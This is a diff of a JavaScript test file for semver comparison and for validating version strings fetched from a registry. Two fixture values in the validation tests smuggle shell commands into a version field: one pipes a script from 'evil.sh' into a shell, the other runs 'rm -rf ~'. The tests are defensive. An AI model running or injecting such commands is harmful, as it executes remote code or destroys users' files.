@@ -30,6 +30,15 @@ describe("isNewer — semver precedence", () => {
     ["build metadata carries no precedence", "1.0.0+build.2", "1.0.0+build.1", false],
     ["an unparseable latest is never newer", "garbage", "0.9.2", false],
     ["an unparseable current is never older", "0.9.2", "test", false],
+    ["a leading zero in the core is not a version", "1.02.3", "1.0.0", false],
+    ["a leading zero in a numeric prerelease identifier is not a version", "1.0.0-01", "0.9.0", false],
+    ["an empty prerelease is not a version", "1.0.0-", "0.9.0", false],
+    ["an empty prerelease identifier is not a version", "1.0.0-a..b", "0.9.0", false],
+    ["empty build metadata is not a version", "1.0.0+", "0.9.0", false],
+    ["a v prefix is not a version", "v1.0.0", "0.9.0", false],
+    ["numeric identifiers past 2^53 compare exactly", "1.0.0-9007199254740993", "1.0.0-9007199254740992", true],
+    ["core parts past 2^53 compare exactly", "9007199254740993.0.0", "9007199254740992.0.0", true],
+    ["a prerelease with build metadata compares by its prerelease", "1.0.0-rc.2+build.1", "1.0.0-rc.1", true],
   ])("%s: isNewer(%s, %s) is %s", (_label, latest, current, expected) => {
     expect(isNewer(latest, current)).toBe(expected);
   });
@@ -41,6 +50,10 @@ describe("fetchLatestVersion — registry response is remote input", () => {
   it.each([
     ["accepts a plain semver", { version: "0.9.1" }, "0.9.1"],
     ["accepts a prerelease tail", { version: "1.0.0-rc.2" }, "1.0.0-rc.2"],
+    ["accepts a prerelease with build metadata", { version: "1.2.3-rc.1+build.5" }, "1.2.3-rc.1+build.5"],
+    ["rejects a leading zero", { version: "1.02.3" }, null],
+    ["rejects an empty prerelease identifier", { version: "1.0.0-a..b" }, null],
+    ["rejects an absurdly long version", { version: `1.0.0-${"a".repeat(300)}` }, null],
     ["rejects a version carrying shell metacharacters", { version: "1.0.0; curl evil.sh | sh" }, null],
     ["rejects a version with whitespace", { version: "1.0.0 && rm -rf ~" }, null],
     ["rejects a non-string version", { version: 12 }, null],
